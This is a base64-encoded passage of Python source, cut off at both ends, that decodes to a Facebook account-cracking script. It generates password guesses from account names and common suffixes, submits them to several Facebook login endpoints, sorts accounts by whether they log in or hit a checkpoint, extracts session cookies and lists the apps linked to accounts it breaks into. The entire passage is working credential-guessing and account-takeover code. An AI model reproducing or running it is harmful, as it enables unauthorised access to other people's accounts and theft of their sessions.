yKCkpDQogICAgX2RhcHVudGFfLmFwcGVuZCgicGFraXN0YW4iKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoInBha2lzdGFuMTIzIikNCiAgICBfZGFwdW50YV8uYXBwZW5kKCI3ODY3ODYiKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoImtoYW5raGFuIikNCiAgICBfZGFwdW50YV8uYXBwZW5kKCIyMjMzNDQiKQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoImtoYW4xMjM0IikNCiAgICByZXR1cm4gX2RhcHVudGFfDQpkZWYgZ2VuZXJhdGU0KF9jaWNpXyk6DQogICAgX2RhcHVudGFfPVtdDQogICAgcHMgPSBvcGVuKCdwYXNzLnR4dCcsJ3InKS5yZWFkKCkNCiAgICBwcCA9IG9wZW4oJ3Bhc3NhbmdrYS50eHQnLCdyJykucmVhZCgpDQogICAgZm9yIGkgaW4gX2NpY2lfLnNwbGl0KCIgIik6ICANCiAgICAgICAgaT1pLmxvd2VyKCkNCiAgICAgICAgaWYgbGVuKGkpPDM6Y29udGludWUNCiAgICAgICAgZWxpZiBsZW4oaSk9PTMgb3IgbGVuKGkpPT00IG9yIGxlbihpKT09NToNCiAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzIikNCiAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzNDUiKQ0KICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyIxMjM0IikNCiAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTEyMiIpDQogICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjc4NiIpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkpDQogICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMyIpDQogICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgIF9kYXB1bnRhXy5hcHBlbmQoaSsiMTIzNCIpDQogICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkrIjExMjIiKQ0KICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZChpKyI3ODYiKQ0KICAgIGlmIHBwIGluIFsnJywnICcsJyAgJ106cGFzcw0KICAgIGVsc2U6DQogICAgICAgIGZvciBpIGluIF9jaWNpXy5zcGxpdCgiICIpOiAgDQogICAgICAgICAgICBpPWkubG93ZXIoKQ0KICAgICAgICAgICAgZm9yIHggaW4gcHAuc3BsaXQoJywnKToNCiAgICAgICAgICAgICAgICBfZGFwdW50YV8uYXBwZW5kKGkreCkNCiAgICBpZiBwcyBpbiBbJycsJyAnLCcgICddOnBhc3MNCiAgICBlbHNlOg0KICAgICAgICBmb3IgeiBpbiBwcy5zcGxpdCgnLCcpOg0KICAgICAgICAgICAgX2RhcHVudGFfLmFwcGVuZCh6KQ0KICAgIF9kYXB1bnRhXy5hcHBlbmQoX2NpY2lfLmxvd2VyKCkpDQogICAgcmV0dXJuIF9kYXB1bnRhXw0KZGVmIHRhbWJhaF9wYXNzKCk6DQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRm9yIEV4YW1wbGUgOiAgcGFraXN0YW4scGFraXN0YW4xMjMsMTIzNDU2LDc4Njc4NiclKE8sUCxPLFApKQ0KICAgIGN1eSA9IGlucHV0KCclc+KdpeKUgVslc+KAoiVzXSAlc01hc3Vra2FuIFBhc3MgVGFtYmFoYW4gTWFudWFsIFsxIEthdGFdIDogJyUoTyxQLE8sUCkpDQogICAgZ2ggPSBvcGVuKCdwYXNzLnR4dCcsJ3cnKQ0KICAgIGdoLndyaXRlKGN1eSkNCiAgICBnaC5jbG9zZQ0KZGVmIHRhbWJhaF9wYXNzX2FuZ2thKCk6DQogICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRm9yIEV4YW1wbGUgOiAzMjEsNzg2LDExMjIsMTIzJyUoTyxQLE8sUCkpDQogICAgY295ID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRW50ZXIgQWRkaXRpb25hbCBQYXNzIEJlaGluZCBOYW1lIDogJyUoTyxQLE8sUCkpDQogICAgeHkgPSBvcGVuKCdwYXNzYW5na2EudHh0JywndycpDQogICAgeHkud3JpdGUoY295KQ0KICAgIHh5LmNsb3NlDQogICAgDQpkZWYgbG9nX2FwaShlbSxwYXMsaG9zdHMpOg0KICAgIHVhID0gb3BlbigndWdlbnQudHh0JywncicpLnJlYWQoKQ0KICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICBoZWFkZXIgPSB7IngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwgMzAwMDAwMDAuMCkpLA0KICAgICAgICAieC1mYi1zaW0taG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KICAgICAgICAieC1mYi1uZXQtaG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KICAgICAgICAieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwNCiAgICAgICAgIngtZmItY29ubmVjdGlvbi10eXBlIjogImNlbGwuQ1RSYWRpb0FjY2Vzc1RlY2hub2xvZ3lIU0RQQSIsDQogICAgICAgICJ1c2VyLWFnZW50IjogdWEsDQogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAgICAgIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgIHBhcmFtID0geydhY2Nlc3NfdG9rZW4nOiAnMzUwNjg1NTMxNzI4JTdDNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLCANCiAgICAgICAgJ2Zvcm1hdCc6ICdqc29uJywgDQogICAgICAgICdzZGtfdmVyc2lvbic6ICcyJywgDQogICAgICAgICdlbWFpbCc6IGVtLCANCiAgICAgICAgJ2xvY2FsZSc6ICdlbl9VUycsIA0KICAgICAgICAncGFzc3dvcmQnOiBwYXMsIA0KICAgICAgICAnc2RrJzogJ2lvcycsIA0KICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLCANCiAgICAgICAgJ3NpZyc6JzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2J30NCiAgICBhcGkgPSAnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4nDQogICAgcmVzcG9uc2UgPSByLmdldChhcGksIHBhcmFtcz1wYXJhbSwgaGVhZGVycz1oZWFkZXIpDQogICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZS50ZXh0IGFuZCAnRUFBQScgaW4gcmVzcG9uc2UudGV4dDoNCiAgICAgICAgcmV0dXJuIHsic3RhdHVzIjoic3VjY2VzcyIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlc3BvbnNlLmpzb24oKVsnZXJyb3JfbXNnJ106DQogICAgICAgIHJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXN9DQogICAgZWxzZTpyZXR1cm4geyJzdGF0dXMiOiJlcnJvciIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KZGVmIGxvZ19tYmFzaWMoZW0scGFzLGhvc3RzKToNCiAgICB1YSA9IG9wZW4oJ3VnZW50LnR4dCcsJ3InKS5yZWFkKCkNCiAgICByID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgci5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6Im1heC1hZ2U9MCIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICBwID0gci5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iKQ0KICAgIGIgPSBiczQuQmVhdXRpZnVsU291cChwLnRleHQsImh0bWwucGFyc2VyIikNCiAgICBtZXRhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoJ2R0c2ciOlx7InRva2VuIjoiKC4qPykiJyxwLnRleHQpKQ0KICAgIGRhdGE9e30NCiAgICBmb3IgaSBpbiBiKCJpbnB1dCIpOg0KICAgICAgICBpZiBpLmdldCgidmFsdWUiKSBpcyBOb25lOg0KICAgICAgICAgICAgaWYgaS5nZXQoIm5hbWUiKT09ImVtYWlsIjoNCiAgICAgICAgICAgICAgICBkYXRhLnVwZGF0ZSh7ImVtYWlsIjplbX0pDQogICAgICAgICAgICBlbGlmIGkuZ2V0KCJuYW1lIik9PSJwYXNzIjoNCiAgICAgICAgICAgICAgICBkYXRhLnVwZGF0ZSh7InBhc3MiOnBhc30pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOiIifSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkNCiAgICBkYXRhLnVwZGF0ZSgNCiAgICAgICAgeyJmYl9kdHNnIjptZXRhLCJtX3Nlc3MiOiIiLCJfX3VzZXIiOiIwIiwNCiAgICAgICAgIl9fcmVxIjoiZCIsIl9fY3NyIjoiIiwiX19hIjoiIiwiX19keW4iOiIiLCJlbmNwYXNzIjoiIg0KICAgICAgICB9DQogICAgKQ0KICAgIHIuaGVhZGVycy51cGRhdGUoeyJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCJ9KQ0KICAgIHBvID0gci5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRmxvZ2luJTJGJTNGcmVmJTNEZGJsJmx3dj0xMDAiLGRhdGE9ZGF0YSkudGV4dA0KICAgIGlmICJjX3VzZXIiIGluIGxpc3Qoci5jb29raWVzLmdldF9kaWN0KCkua2V5cygpKToNCiAgICAgICAgcmV0dXJuIHsic3RhdHVzIjoic3VjY2VzcyIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpyLmNvb2tpZXMuZ2V0X2RpY3QoKX0NCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiBsaXN0KHIuY29va2llcy5nZXRfZGljdCgpLmtleXMoKSk6DQogICAgICAgIHJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOnIuY29va2llcy5nZXRfZGljdCgpfQ0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30NCmRlZiBsb2dfZnJlZShlbSxwYXMsaG9zdHMpOg0KICAgIHVhID0gb3BlbigndWdlbnQudHh0JywncicpLnJlYWQoKQ0KICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICByLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ImZyZWUuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6Im1heC1hZ2U9MCIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICBwID0gci5nZXQoImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vIikNCiAgICBiID0gYnM0LkJlYXV0aWZ1bFNvdXAocC50ZXh0LCJodG1sLnBhcnNlciIpDQogICAgbWV0YT0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCdkdHNnIjpceyJ0b2tlbiI6IiguKj8pIicscC50ZXh0KSkNCiAgICBkYXRhPXt9DQogICAgZm9yIGkgaW4gYigiaW5wdXQiKToNCiAgICAgICAgaWYgaS5nZXQoInZhbHVlIikgaXMgTm9uZToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIik9PSJlbWFpbCI6DQogICAgICAgICAgICAgICAgZGF0YS51cGRhdGUoeyJlbWFpbCI6ZW19KQ0KICAgICAgICAgICAgZWxpZiBpLmdldCgibmFtZSIpPT0icGFzcyI6DQogICAgICAgICAgICAgICAgZGF0YS51cGRhdGUoeyJwYXNzIjpwYXN9KQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKToiIn0pDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgZGF0YS51cGRhdGUoDQogICAgICAgIHsiZmJfZHRzZyI6bWV0YSwibV9zZXNzIjoiIiwiX191c2VyIjoiMCIsDQogICAgICAgICJfX3JlcSI6ImQiLCJfX2NzciI6IiIsIl9fYSI6IiIsIl9fZHluIjoiIiwiZW5jcGFzcyI6IiINCiAgICAgICAgfQ0KICAgICkNCiAgICByLmhlYWRlcnMudXBkYXRlKHsicmVmZXJlciI6Imh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04In0pDQogICAgcG8gPSByLnBvc3QoImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRmxvZ2luJTJGJTNGcmVmJTNEZGJsJmx3dj0xMDAiLGRhdGE9ZGF0YSkudGV4dA0KICAgIGlmICJjX3VzZXIiIGluIGxpc3Qoci5jb29raWVzLmdldF9kaWN0KCkua2V5cygpKToNCiAgICAgICAgcmV0dXJuIHsic3RhdHVzIjoic3VjY2VzcyIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpyLmNvb2tpZXMuZ2V0X2RpY3QoKX0NCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiBsaXN0KHIuY29va2llcy5nZXRfZGljdCgpLmtleXMoKSk6DQogICAgICAgIHJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOnIuY29va2llcy5nZXRfZGljdCgpfQ0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30NCmRlZiBjZWtfbG9nKHVzZXIsIHBhc3csIGhfY3ApOg0KICAgIHVhID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2Ig0KICAgIG1iID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCiAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICBzZXMuaGVhZGVycy51cGRhdGUoew0KICAgICJIb3N0IjogIm1iYXNpYy5mYWNlYm9vay5jb20iLA0KICAgICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsDQogICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAiMSIsDQogICAgIm9yaWdpbiI6IG1iLA0KICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAidXNlci1hZ2VudCI6IHVhLA0KICAgICJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgIngtcmVxdWVzdGVkLXdpdGgiOiAibWFyay52aWEuZ3AiLA0KICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLW9yaWdpbiIsDQogICAgInNlYy1mZXRjaC1tb2RlIjogIm5hdmlnYXRlIiwNCiAgICAic2VjLWZldGNoLXVzZXIiOiAiPzEiLA0KICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJkb2N1bWVudCIsDQogICAgInJlZmVyZXIiOiBtYisiL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsDQogICAgImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwNCiAgICAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43Ig0KICAgIH0pDQogICAgZGF0YSA9IHt9DQogICAgZ2VkID0gcGFyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgIGZtID0gZ2VkLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KICAgIGxpc3QgPSBbImxzZCIsImphem9lc3QiLCJtX3RzIiwibGkiLCJ0cnlfbnVtYmVyIiwidW5yZWNvZ25pemVkX3RyaWVzIiwibG9naW4iLCJiaV94cndoIl0NCiAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgaWYgaS5nZXQoIm5hbWUiKSBpbiBsaXN0Og0KICAgICAgICAgICAgZGF0YS51cGRhdGUoe2kuZ2V0KCJuYW1lIik6aS5nZXQoInZhbHVlIil9KQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgY29udGludWUNCiAgICBkYXRhLnVwZGF0ZSh7ImVtYWlsIjp1c2VyLCJwYXNzIjpwYXN3fSkNCiAgICB0cnk6DQogICAgICAgIHJ1biA9IHBhcihzZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLCBkYXRhPWRhdGEsIGFsbG93X3JlZGlyZWN0cz1UcnVlKS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlRvb01hbnlSZWRpcmVjdHM6DQogICAgICAgIHByaW50KCJbIV0gUmVkaXJlY3QgT3ZlcmxvYWQiKQ0KICAgIGlmICJjX3VzZXIiIGluIHNlcy5jb29raWVzOg0KICAgICAgICByZXR1cm4geyJzdGF0dXMiOiJlcnJvciIsImVtYWlsIjp1c2VyLCJwYXNzIjpwYXN3fQ0KICAgIGVsaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzOg0KICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICBqenN0ID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiamF6b2VzdCJ9KVsidmFsdWUiXQ0KICAgICAgICBuaCAgID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoibmgifSlbInZhbHVlIl0NCiAgICAgICAgZGF0YUQgPSB7DQogICAgICAgICAgICAiZmJfZHRzZyI6IGR0c2csDQogICAgICAgICAgICAiZmJfZHRzZyI6IGR0c2csDQogICAgICAgICAgICAiamF6b2VzdCI6IGp6c3QsDQogICAgICAgICAgICAiamF6b2VzdCI6IGp6c3QsDQogICAgICAgICAgICAiY2hlY2twb2ludF9kYXRhIjoiIiwNCiAgICAgICAgICAgICJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwNCiAgICAgICAgICAgICJuaCI6IG5oDQogICAgICAgIH0NCiAgICAgICAgeG54eCA9IHBhcihzZXMucG9zdChtYitmb3JtWyJhY3Rpb24iXSwgZGF0YT1kYXRhRCkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgbmdldyA9IFt5eS50ZXh0IGZvciB5eSBpbiB4bnh4LmZpbmRfYWxsKCJvcHRpb24iKV0NCiAgICAgICAgb3BzaT1bXQ0KICAgICAgICBvcHRpb25fZGV2ID0gW10NCiAgICAgICAgZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOg0KICAgICAgICAgICAgb3B0aW9uX2Rldi5hcHBlbmQoIlxuICAgICAiK1Arc3RyKG9wdCsxKSsiLiAiK25nZXdbb3B0XSsiICIpDQogICAgICAgIHByaW50KGhfY3ArIiIuam9pbihvcHRpb25fZGV2KSkNCiAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIHBhc3MNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQpkZWYga29raShjb29raWVzKToNCiAgICByZXN1bHQ9W10NCiAgICBmb3IgaSBpbiBlbnVtZXJhdGUoY29va2llcy5rZXlzKCkpOg0KICAgICAgICBpZiBpWzBdPT1sZW4oY29va2llcy5rZXlzKCkpLTE6cmVzdWx0LmFwcGVuZChpWzFdKyI9Iitjb29raWVzW2lbMV1dKQ0KICAgICAgICBlbHNlOnJlc3VsdC5hcHBlbmQoaVsxXSsiPSIrY29va2llc1tpWzFdXSsiOyAiKQ0KICAgIHNhbXBsZSA9ICIiLmpvaW4ocmVzdWx0KQ0KICAgIHNhbV8gICA9IHNhbXBsZS5yZXBsYWNlKCcgJywnJykNCiAgICBzYW1wXyAgPSBzYW1fLnNwbGl0KCc7JykNCiAgICBmaW5hbCA9ICgnJXM7ICVzOyAlczsgJXM7ICVzJyUoc2FtcF9bNF0sc2FtcF9bMV0sc2FtcF9bMF0sc2FtcF9bNV0sc2FtcF9bM10pKQ0KICAgIHJldHVybiBmaW5hbA0KZGVmIGNla19hcGsoaF9vayxfZGFwdW50YV8pOg0KICAgIGFwayA9IFtdDQogICAgc2VzXyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIHVybCA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1hY3RpdmUiDQogICAgZGF0X2dhbWUgPSBzZXNfLmdldCh1cmwsY29va2llcz17J2Nvb2tpZSc6X2RhcHVudGFffSkNCiAgICBkYXRhZ2FtZSA9IHBhcihkYXRfZ2FtZS5jb250ZW50LCdodG1sLnBhcnNlcicpDQogICAgZm9ybV8gICAgPSBkYXRhZ2FtZS5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KICAgIGZvciBhc3UgaW4gZm9ybV8uZmluZF9hbGwoImgzIik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGNlbGVuZyA9IGFzdS5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAgICAgYXBrLmFwcGVuZCgnXG4gICDigKIgJytjZWxlbmcpDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgdXJsMiA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSINCiAgICBkYXRfZ2FtZSA9IHNlc18uZ2V0KHVybDIsY29va2llcz17J2Nvb2tpZSc6X2RhcHVudGFffSkNCiAgICBkYXRhZ2FtZSA9IHBhcihkYXRfZ2FtZS5jb250ZW50LCdodG1sLnBhcnNlcicpDQogICAgZm9ybV8gICAgPSBkYXRhZ2FtZS5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KICAgIGZvciBhc3UgaW4gZm9ybV8uZmluZF9hbGwoImgzIik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGNlbGVuZyA9IGFzdS5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAgICAgYXBrLmFwcGVuZCgnXG4gICDigKIgJytjZWxlbmcpDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgcHJpbnQoaF9vaysnJy5qb2luKGFwaykpDQpkZWYgdGFodW4oZngpOg0KICAgIGlmIGxlbihmeCk9PTE1Og0KICAgICAgICBpZiBmeFs6MTBdIGluIFsnMTAwMDAwMDAwMCddICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDA5Jw0KICAgICAgICBlbGlmIGZ4Wzo5XSBpbiBbJzEwMDAwMDAwMCddICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDA5Jw0KICAgICAgICBlbGlmIGZ4Wzo4XSBpbiBbJzEwMDAwMDAwJ10gICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDA5Jw0KICAgICAgICBlbGlmIGZ4Wzo3XSBpbiBbJzEwMDAwMDAnLCcxMDAwMDAxJywnMTAwMDAwMicsJzEwMDAwMDMnLCcxMDAwMDA0JywnMTAwMDAwNSddOnRhaHVueiA9ICcg4oCiIDIwMDknDQogICAgICAgIGVsaWYgZnhbOjddIGluIFsnMTAwMDAwNicsJzEwMDAwMDcnLCcxMDAwMDA4JywnMTAwMDAwOSddOnRhaHVueiA9ICcg4oCiIDIwMTAnDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDAxJ10gICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTAnDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDAyJywnMTAwMDAzJ10gOnRhaHVueiA9ICcg4oCiIDIwMTEnDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDA0J10gICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTInDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDA1JywnMTAwMDA2J10gOnRhaHVueiA9ICcg4oCiIDIwMTMnDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDA3JywnMTAwMDA4J10gOnRhaHVueiA9ICcg4oCiIDIwMTQnDQogICAgICAgIGVsaWYgZnhbOjZdIGluIFsnMTAwMDA5J10gICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTUnDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDEnXSAgICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTYnDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDInXSAgICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTcnDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDMnXSAgICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTgnDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDQnXSAgICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMTknDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDUnXSAgICAgICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMjAnDQogICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDYnLCcxMDAwNycsJzEwMDA4J106dGFodW56ID0gJyDigKIgMjAyMScNCiAgICAgICAgZWxzZTp0YWh1bno9JycNCiAgICBlbGlmIGxlbihmeCkgaW4gWzksMTBdOg0KICAgICAgICB0YWh1bnogPSAnIOKAoiAyMDA4LzIwMDknDQogICAgZWxpZiBsZW4oZngpPT04Og0KICAgICAgICB0YWh1bnogPSAnIOKAoiAyMDA3LzIwMDgnDQogICAgZWxpZiBsZW4oZngpPT03Og0KICAgICAgICB0YWh1bnogPSAnIOKAoiAyMDA2LzIwMDcnDQogICAgZWxzZTp0YWh1bno9JycNCiAgICByZXR1cm4gdGFodW56DQpjbGFzcyBjcmFjazoNCiAgICBkZWYgX19pbml0X18oc2VsZixmaWxlcyk6DQogICAgICAgIHNlbGYuYWRhID0gW10NCiAgICAgICAgc2VsZi5jcCA9IFtdDQogICAgICAgIHNlbGYua28gPSAwDQogICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICBwcmludCgnJXP